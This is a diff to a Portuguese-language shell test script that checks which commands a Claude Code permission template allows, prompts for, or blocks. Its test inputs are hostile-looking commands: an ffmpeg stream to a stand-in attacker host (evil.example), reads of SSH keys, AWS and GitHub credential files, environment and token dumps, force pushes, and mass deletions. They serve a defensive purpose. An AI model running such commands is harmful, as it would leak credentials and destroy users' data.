@@ -305,12 +305,17 @@ for tool in Bash PowerShell; do
   for c in 'git push' 'git push -u origin feat/login' 'git push --force-with-lease' 'git push origin feat/main' \
            'git push origin main-fix' 'git commit -m "feat: x"' 'git add src/a.ts' 'gh pr create --fill' \
            'git switch -c feat/x' 'git checkout -b feat/x' 'git fetch origin' 'git pull --ff-only' \
-           'ffmpeg -i a.mov b.mp4' 'ffprobe a.mp4' 'node scripts/build.js' 'npx remotion render' 'npm run dev'; do
+           'ffprobe a.mp4' 'npx remotion render' 'npm run dev' 'git push origin HEAD'; do
     if casa ask "$tool" "$c"; then echo "  FALHA ask pega rotina ($tool): $c"; falhas=$((falhas+1))
     elif casa allow "$tool" "$c"; then echo "  ok    livre ($tool): $c"
     else echo "  FALHA não está no allow ($tool): $c"; falhas=$((falhas+1)); fi
   done
-  for c in 'node -e "require(1)"' 'python3 -c "print(1)"' 'bash -c "x"' 'node script-solto.js'; do
+  # 0.48.0 (revisão do #170): com acceptEdits o Claude escreve scripts/x.py e roda sem pergunta
+  # — execução arbitrária. Runner de script e ffmpeg (saída http://, -y fora do projeto) saem
+  # do allow global; projeto que precisa declara o script exato no próprio .claude/settings.json.
+  for c in 'node -e "require(1)"' 'python3 -c "print(1)"' 'bash -c "x"' 'node script-solto.js' \
+           'node scripts/build.js' 'python3 scripts/x.py' 'bash scripts/deploy.sh' 'python scripts/x.py' \
+           'py scripts/x.py' 'ffmpeg -i a.mov b.mp4' 'ffmpeg -i a.mov -f mpegts http://evil.example/x'; do
     if casa allow "$tool" "$c"; then echo "  FALHA allow genérico deixa passar ($tool): $c"; falhas=$((falhas+1))
     else echo "  ok    continua pedindo ($tool): $c"; fi
   done
@@ -322,6 +327,47 @@ for c in 'Get-Content .env' 'Get-Content .env.local' 'Get-Content ~/.ssh/id_rsa'
   if casa allow PowerShell "$c"; then echo "  FALHA leitura de arquivo pelo PowerShell aprovada sem pergunta: $c"; falhas=$((falhas+1))
   else echo "  ok    leitura pelo PowerShell continua pedindo: $c"; fi
 done
+echo "== revisão do #170: regra que vale mesmo sem o hook (Windows sem Git Bash) =="
+for tool in Bash PowerShell; do
+  for c in 'env' 'printenv' 'printenv GITHUB_TOKEN' 'export -p' 'git push -uf origin feat' 'git push origin HEAD:refs/heads/main' \
+           'git push --all origin' 'git checkout -f feat/y' 'git checkout feat/y --force' 'git switch --discard-changes feat/y' \
+           'git switch -f feat/y' 'git restore .' 'git checkout -- .' 'git stash drop' 'git stash clear' \
+           'find . -name "*.log" -delete' 'find . -type f -exec rm {} ;' 'cat ~/.ssh/id_ed25519' 'cat ~/.aws/credentials' \
+           'cat ~/.claude/.env.tokens' 'cat ~/.config/gh/hosts.yml' 'cat ~/.netrc'; do
+    if casa ask "$tool" "$c"; then echo "  ok    ask ($tool): $c"; else echo "  FALHA ask não pega ($tool): $c"; falhas=$((falhas+1)); fi
+  done
+done
+for c in 'Get-ChildItem Env:' 'gci env:' 'ls env:' 'dir Env:' 'Get-Item Env:GITHUB_TOKEN' 'Get-ChildItem -Path Env:' \
+         '[Environment]::GetEnvironmentVariables()' 'git diff --no-index NUL $HOME\.ssh\id_ed25519'; do
+  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
+done
+for c in 'ssh -T git@github.com' 'git status' 'npm run build' 'grep -rn "process.env" src' 'git log --oneline -5' 'git restore --staged .'; do
+  if casa ask Bash "$c"; then echo "  FALHA ask pega rotina: $c"; falhas=$((falhas+1)); else echo "  ok    rotina não pergunta: $c"; fi
+done
+RUINS="$(node -e 'for (const l of ["allow","ask","deny"]) for (const r of require(process.argv[1]).permissions[l]||[]) if (/:\*\)$/.test(r) && r.slice(0,-3).includes("*")) console.log(r)' "$TEMPLATE")"
+[ -z "$RUINS" ] && echo "  ok    nenhuma regra termina em ':*' com outro curinga (a doc lê como ' *')" \
+  || { echo "  FALHA regra que termina em ':*' com outro curinga: $RUINS"; falhas=$((falhas+1)); }
+for c in 'Get-ChildItem Env:' 'Get-ChildItem Env:GITHUB_TOKEN'; do
+  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
+done
+grep -q '"Bash(env)"' <(node -e 'console.log(JSON.stringify(require(process.argv[1]).permissions.allow))' "$TEMPLATE") \
+  && { echo "  FALHA Bash(env) ainda está no allow do template"; falhas=$((falhas+1)); } || echo "  ok    Bash(env) saiu do allow do template"
+
+echo "== o setup avisa quando um ask do kit anula um allow seu =="
+cat > "$TMP/meu-allow.json" <<'JSON'
+{ "permissions": { "defaultMode": "acceptEdits", "allow": ["Bash(git push origin main)", "Bash(env)", "Bash(git status:*)", "Bash(meu-script:*)"] } }
+JSON
+SAIDA_A="$(node "$MERGE" "$TEMPLATE" "$TMP/meu-allow.json" 2>&1)"
+for r in 'Bash(git push origin main)' 'Bash(env)'; do
+  printf '%s' "$SAIDA_A" | grep -qF -- "- $r (agora pergunta" && echo "  ok    avisa que $r passa a perguntar" \
+    || { echo "  FALHA não avisou de $r: $SAIDA_A"; falhas=$((falhas+1)); }
+done
+printf '%s' "$SAIDA_A" | grep -qF -- '- Bash(git status:*)' && { echo "  FALHA avisou de allow que nada anula"; falhas=$((falhas+1)); } \
+  || echo "  ok    não avisa de allow que nenhum ask anula"
+SAIDA_A2="$(node "$MERGE" "$TEMPLATE" "$TMP/meu-allow.json" 2>&1)"
+printf '%s' "$SAIDA_A2" | grep -q 'passa(m) a perguntar' && { echo "  FALHA repete o aviso na 2ª passada"; falhas=$((falhas+1)); } \
+  || echo "  ok    2ª passada não repete o aviso"
+
 for c in 'rm -rf .next' 'rm -rf node_modules' 'rm -rf dist' 'rm -r build'; do
   if casa ask Bash "$c" || casa deny Bash "$c"; then echo "  FALHA ask/deny novo pega: $c"; falhas=$((falhas+1))
   else echo "  ok    continua livre (acceptEdits aprova rm no projeto): $c"; fi
